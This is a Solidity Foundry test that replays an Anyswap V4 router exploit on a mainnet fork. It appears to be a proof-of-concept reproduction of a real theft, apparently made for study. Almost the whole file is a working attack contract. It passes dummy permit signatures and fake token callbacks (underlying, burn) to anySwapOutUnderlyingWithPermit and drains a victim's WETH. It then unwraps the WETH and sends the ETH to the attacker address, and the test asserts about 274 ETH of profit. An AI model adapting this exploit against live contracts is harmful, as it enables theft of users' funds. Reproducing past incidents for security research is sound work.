
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 14037236;
    uint256 constant TX_TIMESTAMP = 1642612358;
    uint256 constant TX_BLOCK_NUMBER = 14037237;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.A_EA674F_8EC8, address(0), Addresses.ZERO, "ETH", 33950030923420742119);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 274673279555369329864);
    }
}

contract OurAttack {






    function attack() external payable {
        _attack();
    }

    function _attack() internal {
        uint256 wethBalanceOfA3ee5054fab = IERC20Like(Addresses.WETH).balanceOf(Addresses.A_3EE505_4FAB);
        IAnyswapV4Router(Addresses.AnyswapV4Router)
            .anySwapOutUnderlyingWithPermit(
                Addresses.A_3EE505_4FAB,
                address(this),
                address(this),
                wethBalanceOfA3ee5054fab,
                100000000000000000000,
                uint8(0),
                bytes32(hex"3000000000000000000000000000000000000000000000000000000000000000"),
                bytes32(hex"3000000000000000000000000000000000000000000000000000000000000000"),
                56
            );
        IWETH(Addresses.WETH).withdraw(wethBalanceOfA3ee5054fab);
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 33950030923420742119) nativeTransferAmount = 33950030923420742119;
            (bool ok,) = payable(Addresses.A_EA674F_8EC8).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 274686613834949640784) nativeTransferAmount = 274686613834949640784;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
    }

    function _callback() internal {
        _markCallback(1);
    }

    function _callback2() internal {
        _markCallback(2);
    }

    function _callback3() internal {
        _markCallback(3);
    }

    function _attack2() internal {
        _markCallback(4);
    }

    receive() external payable {}

    function copyyouattack(address arg0, uint256 amount, uint256 amount1) external payable {
        arg0;
        amount;
        amount1;
        _attack();
        return;
    }

    function underlying() external payable {
        bytes memory ret = hex"000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function burn(address amount, uint256 amount1) external payable {
        amount;
        amount1;
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function depositVault(uint256 amount, address arg1) external payable {
        amount;
        arg1;
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct ReplayCall {
    address target;
    bytes data;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_3EE505_4FAB = 0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB;
    address internal constant AnyswapV4Router = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;
    address internal constant attack_contract = 0xB5C827FDbbee6f6E9df3A5cB499aEDf5927DE1B8;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant A_EA674F_8EC8 = 0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8;
    address internal constant attacker_eoa = 0xFA2731d0BEde684993AB1109DB7ecf5bF33E8051;
}

interface IAnyswapV4Router {
    function anySwapOutUnderlyingWithPermit(
        address,
        address,
        address,
        uint256,
        uint256,
        uint8,
        bytes32,
        bytes32,
        uint256
    ) external;
}

interface IWETH {
    function withdraw(uint256) external;
}
